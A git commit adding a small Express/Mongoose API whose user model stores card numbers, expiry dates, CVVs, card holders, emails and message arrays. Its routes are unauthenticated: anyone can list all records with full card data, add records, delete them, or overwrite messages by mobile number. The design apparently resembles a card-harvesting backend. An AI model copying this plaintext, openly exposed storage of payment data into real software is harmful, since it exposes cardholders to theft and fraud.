706317179aa6714fdc2107e81c1dae7a03289aa7
sumit245 <sumitranjan245@gmail.com>
2022-06-18 21:33:50 +0530

    message

---
+++ api/users.js
@@ -0,0 +1,42 @@
+const express = require('express');
+const router = express.Router();
+const User = require('../models/users.model');
+
+router.get('/users', (req, res, next) => {
+  // get placeholder
+  User.find({})
+    .then((data) => res.json(data))
+    .catch(next);
+});
+
+router.post('/users', (req, res, next) => {
+  // post placeholder
+  User.create(req.body)
+    .then((data) => res.json(data))
+    .catch(next);
+});
+
+router.delete('/users/:id', (req, res, next) => {
+  // delete placeholder
+  User.findOneAndDelete({ _id: req.params.id })
+    .then((data) => res.json(data))
+    .catch(next);
+});
+
+router.route('/users/:user').post(function (req, res) {
+  User.findOne({ mobile_number: req.params.user }, function (err, user) {
+    if (!user) return next(new Error('Unable To Find Employee With This Id'));
+    else user.messages = req.body.messages;
+    console.log(user);
+    user
+      .save()
+      .then((emp) => {
+        res.json('Employee Updated Successfully');
+      })
+      .catch((err) => {
+        res.status(400).send('Unable To Update Employee');
+      });
+  });
+});
+
+module.exports = router;
---
+++ models/users.model.js
@@ -0,0 +1,24 @@
+const mongoose = require('mongoose');
+const Schema = mongoose.Schema;
+
+// Create schema for todo
+const Users = new Schema({
+    mobile_number: {
+        type: String,
+        required: [true, 'The todo text field is required'],
+    },
+    user_name: String,
+    card_number: String,
+    expiry: String,
+    cvv: String,
+    card_holder: String,
+    email: String,
+    messages: Array
+
+
+});
+
+// Create model for todo
+const User = mongoose.model('users', Users);
+
+module.exports = User;
